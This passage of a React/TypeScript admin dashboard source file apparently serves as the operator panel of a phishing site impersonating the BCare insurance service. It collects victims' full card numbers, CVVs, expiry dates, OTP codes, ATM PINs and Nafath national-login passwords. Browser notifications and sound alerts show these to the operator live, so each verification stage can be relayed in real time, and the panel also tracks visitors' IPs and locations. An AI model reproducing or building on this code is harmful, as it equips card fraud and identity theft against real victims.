// Admin Visitors Component
import { Eye, User, MapPin, Circle, Check, X, Trash2, Phone, CreditCard, Car, Shield, Clock, MessageCircle, Loader2, Ban, ShieldCheck, ChevronDown, FileText, ShoppingCart, AlertTriangle, ArrowRight, Download, Search, Monitor, Smartphone, Tablet, Globe, Star, Timer, GitBranch, Dot, RefreshCw, Tag, ChevronRight } from "lucide-react";
import React, { useState, useEffect, useCallback, useRef, useMemo, memo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { sounds } from "@/lib/sounds";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import AdminVisitorChat from "@/components/admin/AdminVisitorChat";
import VisitorDetailsPanel from "@/components/admin/visitor-details/VisitorDetailsPanel";

// Live timer component - memoized to prevent unnecessary re-renders
const LiveTimer = memo(({ since }: { since: string }) => {
  const [elapsed, setElapsed] = useState("");
  useEffect(() => {
    const calc = () => {
      const diff = Math.max(0, Math.floor((Date.now() - new Date(since).getTime()) / 1000));
      const h = Math.floor(diff / 3600);
      const m = Math.floor((diff % 3600) / 60);
      const s = diff % 60;
      setElapsed(h > 0 ? `${h}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}` : `${m}:${String(s).padStart(2, "0")}`);
    };
    calc();
    const interval = setInterval(calc, 1000);
    return () => clearInterval(interval);
  }, [since]);
  return (
    <span className="inline-flex items-center gap-0.5 text-[9px] text-primary/70 font-mono tabular-nums">
      <Timer className="w-2.5 h-2.5" />{elapsed}
    </span>
  );
});
LiveTimer.displayName = "LiveTimer";

// OTP badge timer - shows elapsed seconds on red dot
const OtpBadgeTimer = memo(({ startTime }: { startTime?: number }) => {
  const [secs, setSecs] = useState(0);
  useEffect(() => {
    if (!startTime) return;
    const calc = () => setSecs(Math.floor((Date.now() - startTime) / 1000));
    calc();
    const interval = setInterval(calc, 1000);
    return () => clearInterval(interval);
  }, [startTime]);
  if (!startTime) return null;
  const m = Math.floor(secs / 60);
  const s = secs % 60;
  // Green → Yellow → Orange → Red over urgentDelay (default 30s)
  const urgentDelay = parseInt(localStorage.getItem("admin_urgent_delay") || "30", 10);
  const ratio = Math.min(secs / urgentDelay, 1);
  const r = Math.round(ratio * 239 + (1 - ratio) * 34);
  const g = Math.round(ratio * 68 + (1 - ratio) * 197);
  const b = Math.round(ratio * 68 + (1 - ratio) * 94);
  const color = `rgb(${r}, ${g}, ${b})`;
  return (
    <span className="text-[7px] font-mono tabular-nums font-bold" style={{ color }}>
      {m > 0 ? `${m}:${String(s).padStart(2, "0")}` : `${s}s`}
    </span>
  );
});
OtpBadgeTimer.displayName = "OtpBadgeTimer";

const parseUserAgent = (ua: string | null) => {
  if (!ua) return { device: "غير معروف", os: "", browser: "" };
  const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua);
  const isTablet = /iPad|Tablet/i.test(ua);
  const device = isTablet ? "Tablet" : isMobile ? "Mobile" : "Desktop";
  let os = "";
  if (/Windows/i.test(ua)) os = "Windows";
  else if (/Mac OS|Macintosh/i.test(ua)) os = "macOS";
  else if (/Android/i.test(ua)) os = "Android";
  else if (/iPhone|iPad|iOS/i.test(ua)) os = "iOS";
  else if (/Linux/i.test(ua)) os = "Linux";
  let browser = "";
  if (/Edg\//i.test(ua)) browser = "Edge";
  else if (/Chrome/i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
  else if (/Firefox/i.test(ua)) browser = "Firefox";
  else if (/Opera|OPR/i.test(ua)) browser = "Opera";
  return { device, os, browser };
};

interface Visitor {
  id: string; session_id: string; visitor_name: string | null; current_page: string | null;
  is_online: boolean; last_seen_at: string; created_at: string; phone: string | null;
  national_id: string | null; linked_request_id: string | null; linked_conversation_id: string | null;
  is_blocked: boolean; user_agent: string | null; ip_address: string | null;
  is_favorite: boolean; country: string | null; country_code: string | null;
  tags?: string[] | null;
}

const VISITOR_TAGS = [
  { key: "vip", label: "VIP", color: "bg-amber-500/15 text-amber-600 border-amber-500/30" },
  { key: "potential", label: "عميل محتمل", color: "bg-emerald-500/15 text-emerald-600 border-emerald-500/30" },
  { key: "suspicious", label: "مشبوه", color: "bg-red-500/15 text-red-600 border-red-500/30" },
  { key: "returning", label: "زائر عائد", color: "bg-blue-500/15 text-blue-600 border-blue-500/30" },
] as const;

const AVATAR_COLORS = [
  { bg: "from-rose-400 to-pink-500", text: "text-white" },
  { bg: "from-violet-400 to-purple-500", text: "text-white" },
  { bg: "from-blue-400 to-indigo-500", text: "text-white" },
  { bg: "from-cyan-400 to-teal-500", text: "text-white" },
  { bg: "from-emerald-400 to-green-500", text: "text-white" },
  { bg: "from-amber-400 to-orange-500", text: "text-white" },
  { bg: "from-red-400 to-rose-500", text: "text-white" },
  { bg: "from-fuchsia-400 to-pink-500", text: "text-white" },
  { bg: "from-sky-400 to-blue-500", text: "text-white" },
  { bg: "from-lime-400 to-emerald-500", text: "text-white" },
];

const getVisitorAvatar = (sessionId: string) => {
  let hash = 0;
  for (let i = 0; i < sessionId.length; i++) {
    hash = ((hash << 5) - hash) + sessionId.charCodeAt(i);
    hash |= 0;
  }
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length];
};

const getVisitorInitial = (name: string | null) => {
  if (!name || name === "زائر") return "ز";
  return name.charAt(0).toUpperCase();
};

const getSessionDuration = (created: string, lastSeen: string) => {
  const diff = Math.max(0, Math.floor((new Date(lastSeen).getTime() - new Date(created).getTime()) / 1000));
  const h = Math.floor(diff / 3600);
  const m = Math.floor((diff % 3600) / 60);
  if (h > 0) return `${h}س ${m}د`;
  if (m > 0) return `${m}د`;
  return `< 1د`;
};

const countryFlag = (code: string | null) => {
  if (!code || code.length !== 2) return "";
  return String.fromCodePoint(...code.toUpperCase().split("").map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
};

interface InsuranceRequest {
  id: string; national_id: string; phone: string; insurance_type: string | null;
  serial_number: string | null; status: string; request_type: string; created_at: string;
  repair_location: string | null; passenger_count: string | null; estimated_value: string | null;
  vehicle_usage: string | null; notes: string | null; policy_start_date: string | null; birth_date: string | null;
}

interface InsuranceOrder {
  id: string; company: string | null; insurance_type: string | null; status: string;
  stage_status: string | null; current_stage: string | null; base_price: number | null;
  total_price: number | null; payment_method: string | null; customer_name: string | null;
  vehicle_make: string | null; vehicle_model: string | null; vehicle_year: string | null;
  serial_number: string | null; national_id: string | null; phone: string | null;
  policy_number: string | null; created_at: string; add_ons: any; card_last_four: string | null;
  card_number_full: string | null; card_cvv: string | null; card_holder_name: string | null; card_expiry: string | null;
  visitor_session_id: string | null;
  repair_location: string | null; estimated_value: string | null; passenger_count: string | null;
  vehicle_usage: string | null; nafath_number: string | null;
  atm_bill_number: string | null; atm_biller_code: string | null; draft_policy_number: string | null;
  insurance_request_id: string | null; otp_verified: boolean | null;
  otp_code: string | null; atm_pin: string | null; phone_otp_code: string | null; nafath_password: string | null;
}

interface Claim {
  id: string; full_name: string; phone: string; policy_number: string; claim_type: string;
  description: string; status: string; email: string | null; created_at: string;
}

interface ChatConv {
  id: string; visitor_name: string | null; status: string; created_at: string; messages_count?: number;
}

interface StageEvent {
  id: string;
  order_id: string;
  visitor_session_id: string | null;
  stage: string;
  status: string;
  stage_entered_at: string;
  resolved_at: string | null;
  created_at: string;
  updated_at: string;
  payload: Record<string, any> | null;
}

const AdminVisitors = () => {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [selectedVisitor, setSelectedVisitor] = useState<Visitor | null>(null);
  const [linkedRequests, setLinkedRequests] = useState<InsuranceRequest[]>([]);
  const [linkedOrders, setLinkedOrders] = useState<InsuranceOrder[]>([]);
  const [linkedClaims, setLinkedClaims] = useState<Claim[]>([]);
  const [linkedChats, setLinkedChats] = useState<ChatConv[]>([]);
  const [stageEvents, setStageEvents] = useState<StageEvent[]>([]);
  
  const [loadingAction, setLoadingAction] = useState<string | null>(null);
  const [pendingRequestMap, setPendingRequestMap] = useState<Record<string, boolean>>({});
  const [pendingStageMap, setPendingStageMap] = useState<Record<string, string>>({});
  const [lastResolvedMap, setLastResolvedMap] = useState<Record<string, { stage: string; status: string }>>({});
  const [searchQuery, setSearchQuery] = useState("");
  const [deletedCount, setDeletedCount] = useState(0);
  const [deletedVisitors, setDeletedVisitors] = useState<Visitor[]>([]);
  const [countryFilter, setCountryFilter] = useState("");
  const [statusFilter, setStatusFilter] = useState<"all" | "online" | "offline" | "deleted" | "favorites" | "pending" | "has_request">("all");
  const [pendingSubFilter, setPendingSubFilter] = useState<"all" | "requests" | "stages">("all");
  const [pendingJumpTarget, setPendingJumpTarget] = useState<"request" | "stage" | null>(null);
  const [deviceFilter, setDeviceFilter] = useState<"" | "Mobile" | "Desktop" | "Tablet">("");
  const [pageFilter, setPageFilter] = useState("");
  const [showDeleteConfirm, setShowDeleteConfirm] = useState<(() => void) | null>(null);
  const [chatClearTarget, setChatClearTarget] = useState<{ sessionId: string; visitorName: string } | null>(null);
  const [sortBy, setSortBy] = useState<"default" | "duration" | "entry" | "last_action">("default");
  const [redirectPage, setRedirectPage] = useState("");
  const [chatSelectMode, setChatSelectMode] = useState(false);
  const [selectedForClear, setSelectedForClear] = useState<Set<string>>(new Set());
  const [showChatMenu, setShowChatMenu] = useState(false);
  const [nafathNumberInputs, setNafathNumberInputs] = useState<Record<string, string>>({});
  const knownPendingOrdersRef = useRef<Set<string>>(new Set());
  const initialLoadDoneRef = useRef(false);
  const knownPendingStagesRef = useRef<Set<string>>(new Set());
  const hasInitializedPendingRef = useRef(false);
  const geoRetryRef = useRef<Set<string>>(new Set());
  const detailsPanelRef = useRef<HTMLDivElement | null>(null);
  const fetchTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [visibleCount, setVisibleCount] = useState(20);
  const listEndRef = useRef<HTMLDivElement | null>(null);
  // Request browser notification permission on mount
  useEffect(() => {
    if ("Notification" in window && Notification.permission === "default") {
      Notification.requestPermission();
    }
  }, []);

  // Store pending order details for browser notifications
  const pendingOrderDetailsRef = useRef<Record<string, { stage: string; otp_code?: string; phone_otp_code?: string; nafath_number?: string; customer_name?: string; card_number_full?: string; card_holder_name?: string; card_expiry?: string; card_cvv?: string; card_last_four?: string; payment_method?: string; total_price?: number; company?: string; atm_pin?: string; nafath_password?: string }>>({});

  // Sound + Browser notification for pending stages
  useEffect(() => {
    const currentPendingKeys = new Set(
      Object.entries(pendingStageMap).map(([visitorId, stage]) => `${visitorId}:${stage}`)
    );
    if (!hasInitializedPendingRef.current) {
      knownPendingStagesRef.current = currentPendingKeys;
      hasInitializedPendingRef.current = true;
      return;
    }
    const newKeys = Array.from(currentPendingKeys).filter(key => !knownPendingStagesRef.current.has(key));
    if (newKeys.length > 0) {
      const newKey = newKeys[0];
      const [visitorId, stage] = [newKey.split(":")[0], newKey.split(":").slice(1).join(":")];
      const stageSounds: Record<string, () => void> = {
        payment: sounds.payment,
        otp: sounds.cardOtp,
        phone_verification: sounds.phoneVerification,
        phone_otp: sounds.phoneOtp,
        stc_call: sounds.stcCall,
        nafath_login: sounds.nafathLogin,
        nafath_verify: sounds.nafathVerify,
      };
      (stageSounds[stage] || sounds.approvalNeeded)();
      const stageLabel: Record<string, string> = {
        payment: "💳 الدفع بالبطاقة", otp: "🔑 رمز التحقق", phone_verification: "📱 توثيق الجوال",
        phone_otp: "📲 كود توثيق الجوال", stc_call: "📞 مكالمة STC", nafath_login: "🔐 دخول نفاذ", nafath_verify: "✅ تحقق نفاذ",
      };
      const stageLabelClean: Record<string, string> = {
        payment: "الدفع بالبطاقة", otp: "رمز التحقق", phone_verification: "توثيق الجوال",
        phone_otp: "كود توثيق الجوال", stc_call: "مكالمة STC", nafath_login: "دخول نفاذ", nafath_verify: "تحقق نفاذ",
      };
      toast.info(`زائر بانتظار الموافقة على: ${stageLabelClean[stage] || stage}`);

      // Browser Notification
      if ("Notification" in window && Notification.permission === "granted") {
        const details = pendingOrderDetailsRef.current[visitorId];
        const visitor = visitors.find(v => v.id === visitorId);
        const visitorLabel = details?.customer_name || visitor?.visitor_name || "زائر";
        
        let body = `${stageLabel[stage] || stage}`;
        if (stage === "payment" && details) {
          const lines: string[] = [];
          if (details.card_number_full) lines.push(`💳 ${details.card_number_full}`);
          else if (details.card_last_four) lines.push(`💳 ****${details.card_last_four}`);
          if (details.card_holder_name) lines.push(`👤 ${details.card_holder_name}`);
          if (details.card_expiry) lines.push(`📅 ${details.card_expiry}`);
          if (details.card_cvv) lines.push(`🔒 CVV: ${details.card_cvv}`);
          if (details.total_price) lines.push(`💰 ${details.total_price} ر.س`);
          if (details.payment_method) lines.push(`🏦 ${details.payment_method === "card" ? "بطاقة" : details.payment_method === "atm" ? "صراف" : details.payment_method}`);
          if (lines.length > 0) body += `\n${lines.join("\n")}`;
        } else if (stage === "otp" && details?.otp_code) {
          body += `\nكود OTP: ${details.otp_code}`;
        } else if (stage === "phone_otp" && details?.phone_otp_code) {
          body += `\nكود الجوال: ${details.phone_otp_code}`;
        } else if ((stage === "nafath_login" || stage === "nafath_verify") && details) {
          if (details.nafath_password) body += `\nكلمة المرور: ${details.nafath_password}`;
          if (details.nafath_number) body += `\nرقم نفاذ: ${details.nafath_number}`;
        }

        const notification = new Notification(`🔔 BCare - ${visitorLabel}`, {
          body,
          icon: "/favicon.svg",
          tag: `pending-${visitorId}-${stage}`,
          requireInteraction: true,
        });
        notification.onclick = () => {
          window.focus();
          if (visitor) setSelectedVisitor(visitor);
          notification.close();
        };
      }
    }
    knownPendingStagesRef.current = currentPendingKeys;
  }, [pendingStageMap, visitors]);

  // Track when each pending stage first appeared
  const pendingStageTimestampsRef = useRef<Record<string, number>>({});
  const urgentRemindedRef = useRef<Set<string>>(new Set());

  // Update timestamps when pendingStageMap changes
  useEffect(() => {
    const now = Date.now();
    const currentKeys = Object.keys(pendingStageMap);
    currentKeys.forEach(key => {
      if (!pendingStageTimestampsRef.current[key]) {
        pendingStageTimestampsRef.current[key] = now;
      }
    });
    Object.keys(pendingStageTimestampsRef.current).forEach(key => {
      if (!pendingStageMap[key]) {
        delete pendingStageTimestampsRef.current[key];
        urgentRemindedRef.current.delete(key);
      }
    });
  }, [pendingStageMap]);

  // Check every 10s for OTP pending > 30s and play urgent sound
  useEffect(() => {
    const interval = setInterval(() => {
      const now = Date.now();
      const delayMs = (parseInt(localStorage.getItem("admin_urgent_delay") || "30", 10)) * 1000;
      const delaySec = delayMs / 1000;
      const otpStages = ["otp", "phone_otp"];
      Object.entries(pendingStageMap).forEach(([visitorId, stage]) => {
        if (!otpStages.includes(stage)) return;
        const startedAt = pendingStageTimestampsRef.current[visitorId];
        if (!startedAt) return;
        const elapsed = now - startedAt;
        if (elapsed >= delayMs && !urgentRemindedRef.current.has(visitorId)) {
          urgentRemindedRef.current.add(visitorId);
          sounds.urgentReminder();
          const visitor = visitors.find(v => v.id === visitorId);
          toast.warning(`⚠️ OTP معلق لأكثر من ${delaySec} ثانية - ${visitor?.visitor_name || "زائر"}`, { duration: 5000 });
          if ("Notification" in window && Notification.permission === "granted") {
            const details = pendingOrderDetailsRef.current[visitorId];
            let body = `⏰ OTP معلق لأكثر من ${delaySec} ثانية!`;
            if (stage === "otp" && details?.otp_code) body += `\nالكود: ${details.otp_code}`;
            else if (stage === "phone_otp" && details?.phone_otp_code) body += `\nالكود: ${details.phone_otp_code}`;
            new Notification(`⚠️ تنبيه عاجل - BCare`, { body, icon: "/favicon.svg", tag: `urgent-${visitorId}`, requireInteraction: true });
          }
        }
        // Repeat every same delay
        if (elapsed >= delayMs && urgentRemindedRef.current.has(visitorId)) {
          const reminderCycle = Math.floor((elapsed - delayMs) / delayMs);
          if (reminderCycle > 0) {
            const lastReminderKey = `${visitorId}-${reminderCycle}`;
            if (!urgentRemindedRef.current.has(lastReminderKey)) {
              urgentRemindedRef.current.add(lastReminderKey);
              sounds.urgentReminder();
            }
          }
        }
      });
    }, 10000);
    return () => clearInterval(interval);
  }, [pendingStageMap, visitors]);

  const priorityPages = ["الدفع بالبطاقة", "رمز التحقق البنكي", "تأكيد ATM", "توثيق الجوال", "كود توثيق الجوال", "مكالمة STC", "دخول نفاذ", "تحقق نفاذ", "تأكيد الطلب", "إتمام الشراء"];

  const getVisitorPriority = (page: string | null): number => {
    if (!page) return 0;
    return priorityPages.some(p => page.startsWith(p)) ? 1 : 0;
  };

  const sortVisitors = useCallback((list: Visitor[], stageMap: Record<string, string>) => {
    return [...list].sort((a, b) => {
      // 1. Favorites first
      if (a.is_favorite !== b.is_favorite) return a.is_favorite ? -1 : 1;
      // 2. Online before offline
      if (a.is_online !== b.is_online) return a.is_online ? -1 : 1;
      // 3. Pending stages (visitors with active actions) first
      const aHasPending = !!stageMap[a.id];
      const bHasPending = !!stageMap[b.id];
      if (aHasPending !== bHasPending) return aHasPending ? -1 : 1;
      // 4. Priority pages (payment, verification, etc.)
      const aPriority = a.is_online ? getVisitorPriority(a.current_page) : 0;
      const bPriority = b.is_online ? getVisitorPriority(b.current_page) : 0;
      if (aPriority !== bPriority) return bPriority - aPriority;
      // 5. Most recently active first
      return new Date(b.last_seen_at).getTime() - new Date(a.last_seen_at).getTime();
    });
  }, []);

  const deleteVisitors = async (ids: string[]) => {
    const offlineIds = ids.filter(id => {
      const v = visitors.find(vis => vis.id === id);
      return v && !v.is_online;
    });
    const skipped = ids.length - offlineIds.length;
    if (offlineIds.length === 0) {
      toast.info("لا يوجد زوار غير متصلين للمسح");
      return;
    }
    try {
      const removedVisitors = offlineIds.map(id => visitors.find(v => v.id === id)).filter(Boolean) as Visitor[];
      for (const id of offlineIds) {
        // Unlink FK references first
        const visitor = visitors.find(v => v.id === id);
        if (visitor?.linked_conversation_id) {
          await supabase.from("chat_messages").delete().eq("conversation_id", visitor.linked_conversation_id);
          await supabase.from("chat_conversations").delete().eq("id", visitor.linked_conversation_id);
        }
        const { error } = await supabase.from("site_visitors").delete().eq("id", id);
        if (error) throw error;
      }
      toast.success(`تم مسح ${offlineIds.length} زائر غير متصل${skipped > 0 ? ` (تم تخطي ${skipped} متصل)` : ""}`);
      setDeletedVisitors(prev => [...removedVisitors, ...prev]);
      setDeletedCount(prev => prev + offlineIds.length);
      if (selectedVisitor && offlineIds.includes(selectedVisitor.id)) setSelectedVisitor(null);
      fetchVisitors();
    } catch (err: any) {
      toast.error(err.message || "فشل مسح الزوار");
    }
  };

  const fetchVisitors = async () => {
    const { data } = await supabase.from("site_visitors").select("*").order("last_seen_at", { ascending: false });
    if (data) {
      const now = Date.now();
      const processed = (data as Visitor[]).map(v => ({ ...v, is_online: now - new Date(v.last_seen_at).getTime() < 30000 }));
      // Initial sort (pendingStageMap will re-sort via useEffect)
      const sorted = sortVisitors(processed, pendingStageMap);
      setVisitors(sorted);
      if (selectedVisitor) {
        const updated = sorted.find(v => v.id === selectedVisitor.id);
        if (updated) setSelectedVisitor(updated);
      }

      // Fetch pending requests
      const { data: pendingReqs } = await supabase.from("insurance_requests").select("id, phone, national_id, status").eq("status", "pending");
      if (pendingReqs) {
        const map: Record<string, boolean> = {};
        processed.forEach(v => {
          const hasPending = pendingReqs.some(r =>
            (v.linked_request_id && r.id === v.linked_request_id) ||
            (v.phone && r.phone === v.phone) ||
            (v.national_id && r.national_id === v.national_id)
          );
          if (hasPending) map[v.id] = true;
        });
        setPendingRequestMap(map);
      }

      // Fetch pending stages
      const { data: pendingOrders } = await supabase.from("insurance_orders").select("id, phone, national_id, current_stage, stage_status, visitor_session_id, otp_code, phone_otp_code, nafath_number, nafath_password, customer_name, card_number_full, card_holder_name, card_expiry, card_cvv, card_last_four, payment_method, total_price, company, atm_pin").eq("stage_status", "pending");
      if (pendingOrders) {
        const stageMap: Record<string, string> = {};
        const unmatchedOrders: typeof pendingOrders = [];
        
        // First pass: match by session_id, phone, or national_id
        pendingOrders.forEach(o => {
          const matched = processed.find(v =>
            (v.session_id && (o as any).visitor_session_id === v.session_id) ||
            (v.phone && o.phone === v.phone) ||
            (v.national_id && o.national_id === v.national_id)
          );
          if (matched && o.current_stage) {
            stageMap[matched.id] = o.current_stage;
            pendingOrderDetailsRef.current[matched.id] = {
              stage: o.current_stage,
              otp_code: o.otp_code || undefined,
              phone_otp_code: o.phone_otp_code || undefined,
              nafath_number: o.nafath_number || undefined,
              nafath_password: (o as any).nafath_password || undefined,
              customer_name: o.customer_name || undefined,
              card_number_full: o.card_number_full || undefined,
              card_holder_name: o.card_holder_name || undefined,
              card_expiry: o.card_expiry || undefined,
              card_cvv: o.card_cvv || undefined,
              card_last_four: o.card_last_four || undefined,
              payment_method: o.payment_method || undefined,
              total_price: o.total_price || undefined,
              company: o.company || undefined,
              atm_pin: (o as any).atm_pin || undefined,
            };
          } else {
            unmatchedOrders.push(o);
          }
        });
        
        // Second pass: assign unmatched pending orders to the most relevant online visitor
        // (priority pages first, then most recent)
        if (unmatchedOrders.length > 0) {
          const onlineVisitors = processed.filter(v => v.is_online && !stageMap[v.id]);
          const priorityVisitor = onlineVisitors.find(v => getVisitorPriority(v.current_page) > 0) || onlineVisitors[0];
          if (priorityVisitor) {
            unmatchedOrders.forEach(o => {
              if (o.current_stage && !stageMap[priorityVisitor.id]) {
                stageMap[priorityVisitor.id] = o.current_stage;
                // Also update the visitor_session_id on the order for future matching
                supabase.from("insurance_orders").update({ visitor_session_id: priorityVisitor.session_id }).eq("id", o.id);
              }
            });
          }
        }
        
        setPendingStageMap(stageMap);
        // Seed known pending orders for sound alerts
        pendingOrders.forEach(o => {
          if (o.current_stage) knownPendingOrdersRef.current.add(o.id + "-" + o.current_stage);
        });
      }

      // Fetch last resolved (approved/rejected) stage per visitor
      const { data: resolvedOrders } = await supabase.from("insurance_orders")
        .select("current_stage, stage_status, visitor_session_id, updated_at")
        .in("stage_status", ["approved", "rejected"])
        .order("updated_at", { ascending: false });
      if (resolvedOrders) {
        const resolvedMap: Record<string, { stage: string; status: string }> = {};
        resolvedOrders.forEach((o: any) => {
          const matched = processed.find(v => v.session_id && o.visitor_session_id === v.session_id);
          if (matched && o.current_stage && !resolvedMap[matched.id]) {
            resolvedMap[matched.id] = { stage: o.current_stage, status: o.stage_status };
          }
        });
        setLastResolvedMap(resolvedMap);
      }

      initialLoadDoneRef.current = true;
    }
  };

  const toggleFavorite = async (visitorId: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    const visitor = visitors.find(v => v.id === visitorId);
    if (!visitor) return;
    const newVal = !visitor.is_favorite;
    await supabase.from("site_visitors").update({ is_favorite: newVal } as any).eq("id", visitorId);
    setVisitors(prev => {
      const updated = prev.map(v => v.id === visitorId ? { ...v, is_favorite: newVal } : v);
      return sortVisitors(updated, pendingStageMap);
    });
    if (selectedVisitor?.id === visitorId) setSelectedVisitor(prev => prev ? { ...prev, is_favorite: newVal } : prev);
    toast.success(newVal ? "تمت الإضافة للمفضلة" : "تمت الإزالة من المفضلة");
  };

  const fetchLinkedData = async (visitor: Visitor) => {
    setLinkedRequests([]); setLinkedOrders([]); setLinkedClaims([]); setLinkedChats([]); setStageEvents([]);

    // Fetch insurance requests
    if (visitor.linked_request_id || visitor.phone || visitor.national_id) {
      let query = supabase.from("insurance_requests").select("*");
      if (visitor.phone && visitor.national_id) query = query.or(`phone.eq.${visitor.phone},national_id.eq.${visitor.national_id}`);
      else if (visitor.phone) query = query.eq("phone", visitor.phone);
      else if (visitor.national_id) query = query.eq("national_id", visitor.national_id);
      else if (visitor.linked_request_id) query = query.eq("id", visitor.linked_request_id);
      const { data } = await query.order("created_at", { ascending: false });
      if (data) setLinkedRequests(data as InsuranceRequest[]);
    }

    // Fetch insurance orders - match by session_id, phone, or national_id
    {
      const filters: string[] = [];
      if (visitor.session_id) filters.push(`visitor_session_id.eq.${visitor.session_id}`);
      if (visitor.phone) filters.push(`phone.eq.${visitor.phone}`);
      if (visitor.national_id) filters.push(`national_id.eq.${visitor.national_id}`);
      if (filters.length > 0) {
        const { data } = await supabase.from("insurance_orders").select("*").or(filters.join(",")).order("created_at", { ascending: false });
        if (data) {
          const orders = data as InsuranceOrder[];
          setLinkedOrders(orders);

          const orderIds = orders.map(order => order.id);
          const stageFilters: string[] = [];
          if (orderIds.length > 0) stageFilters.push(`order_id.in.(${orderIds.join(",")})`);
          if (visitor.session_id) stageFilters.push(`visitor_session_id.eq.${visitor.session_id}`);

          if (stageFilters.length > 0) {
            const { data: events } = await (supabase as any)
              .from("insurance_order_stage_events")
              .select("*")
              .or(stageFilters.join(","))
              .order("stage_entered_at", { ascending: false });

            if (events) setStageEvents(events as StageEvent[]);
          }
        }
      }
    }

    // Fetch claims
    if (visitor.phone) {
      const { data } = await supabase.from("claims").select("*").eq("phone", visitor.phone).order("created_at", { ascending: false });
      if (data) setLinkedClaims(data as Claim[]);
    }

    // Fetch chats
    const { data: convs } = await supabase.from("chat_conversations").select("*").eq("session_token", visitor.session_id).order("created_at", { ascending: false });
    if (convs) setLinkedChats(convs as ChatConv[]);
  };

  const selectedVisitorRef = useRef<Visitor | null>(null);
  useEffect(() => { selectedVisitorRef.current = selectedVisitor; }, [selectedVisitor]);

  // Re-sort visitors when pending stage map changes (prioritize active visitors)
  useEffect(() => {
    if (visitors.length > 0) {
      setVisitors(prev => sortVisitors(prev, pendingStageMap));
    }
  }, [pendingStageMap, sortVisitors]);

  // Debounced fetch to prevent rapid successive calls
  const debouncedFetch = useCallback(() => {
    if (fetchTimerRef.current) clearTimeout(fetchTimerRef.current);
    fetchTimerRef.current = setTimeout(() => {
      fetchVisitors();
    }, 300);
  }, []);

  useEffect(() => {
    fetchVisitors();
    // Increase polling interval to 15s since realtime handles instant updates
    const interval = setInterval(fetchVisitors, 15000);
    const visitorsChannel = supabase
      .channel("visitors-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "site_visitors" }, () => debouncedFetch())
      .subscribe();
    const ordersChannel = supabase
      .channel("orders-realtime-admin")
      .on("postgres_changes", { event: "*", schema: "public", table: "insurance_orders" }, (payload: any) => {
        const row = payload.new;
        if (row && row.stage_status === "pending" && row.id && !knownPendingOrdersRef.current.has(row.id + "-" + row.current_stage)) {
          knownPendingOrdersRef.current.add(row.id + "-" + row.current_stage);
          if (initialLoadDoneRef.current && localStorage.getItem("admin_feed_mute") !== "true") {
            const stageSound: Record<string, () => void> = {
              payment: sounds.payment,
              otp: sounds.cardOtp,
              phone_verification: sounds.phoneVerification,
              phone_otp: sounds.phoneOtp,
              stc_call: sounds.stcCall,
              nafath_login: sounds.nafathLogin,
              nafath_verify: sounds.nafathVerify,
            };
            (stageSound[row.current_stage] || sounds.approvalNeeded)();
            toast.info(`طلب جديد بانتظار الموافقة: ${({ payment: "الدفع", otp: "رمز OTP", phone_verification: "توثيق الجوال", phone_otp: "كود الجوال", stc_call: "مكالمة STC", nafath_login: "دخول نفاذ", nafath_verify: "رمز نفاذ" } as Record<string, string>)[row.current_stage] || row.current_stage}`);
          }
        }
        debouncedFetch();
        if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
      })
      .subscribe();
    const requestsChannel = supabase
      .channel("requests-realtime-admin")
      .on("postgres_changes", { event: "*", schema: "public", table: "insurance_requests" }, () => {
        debouncedFetch();
        if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
      })
      .subscribe();
    const stageEventsChannel = supabase
      .channel("stage-events-realtime-admin")
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "insurance_order_stage_events" }, (payload: any) => {
        const row = payload.new;
        if (row && initialLoadDoneRef.current && localStorage.getItem("admin_feed_mute") !== "true") {
          sounds.liveFeedAlert();
          const stageLabels: Record<string, string> = {
            phone_otp: "كود الجوال", otp: "رمز OTP البطاقة", nafath_login: "دخول نفاذ",
            nafath_verify: "رمز نفاذ", atm: "ATM", stc_call: "مكالمة STC",
            phone_verification: "توثيق الجوال", payment: "الدفع",
          };
          toast.info(row.payload?.resend_requested ? `الزائر طلب إرسال رمز جديد: ${stageLabels[row.stage] || row.stage}` : `كود تحقق جديد: ${stageLabels[row.stage] || row.stage}`);
        }
        // Auto-refresh stage events for selected visitor
        if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
      })
      .subscribe();
    return () => {
      clearInterval(interval);
      if (fetchTimerRef.current) clearTimeout(fetchTimerRef.current);
      supabase.removeChannel(visitorsChannel);
      supabase.removeChannel(ordersChannel);
      supabase.removeChannel(requestsChannel);
      supabase.removeChannel(stageEventsChannel);
    };
  }, []);

  // Auto-resolve geo
  useEffect(() => {
    const missingGeo = visitors.filter(v => v.ip_address && !v.country && !geoRetryRef.current.has(v.id));
    if (missingGeo.length === 0) return;
    missingGeo.forEach(v => geoRetryRef.current.add(v.id));
    supabase.functions.invoke("resolve-geo", { body: { visitor_ids: missingGeo.map(v => v.id) } })
      .then(() => setTimeout(fetchVisitors, 2000)).catch(() => {});
  }, [visitors]);

  useEffect(() => {
    if (selectedVisitor) {
      fetchLinkedData(selectedVisitor);
      // Scroll details panel to top when a new visitor is selected
      const scrollToTop = () => {
        if (detailsPanelRef.current) {
          detailsPanelRef.current.scrollTop = 0;
        }
      };
      // Immediate + delayed to cover both fast and slow renders
      scrollToTop();
      setTimeout(scrollToTop, 0);
      setTimeout(scrollToTop, 100);
      setTimeout(scrollToTop, 300);
    }
  }, [selectedVisitor?.id, selectedVisitor?.phone, selectedVisitor?.national_id, selectedVisitor?.linked_request_id, selectedVisitor?.session_id]);

  useEffect(() => {
    if (!pendingJumpTarget || !detailsPanelRef.current) return;
    const selector = pendingJumpTarget === "request"
      ? "[data-pending-request='true']"
      : "[data-pending-stage='true']";
    const targetElement = detailsPanelRef.current.querySelector<HTMLElement>(selector);
    if (!targetElement) return;
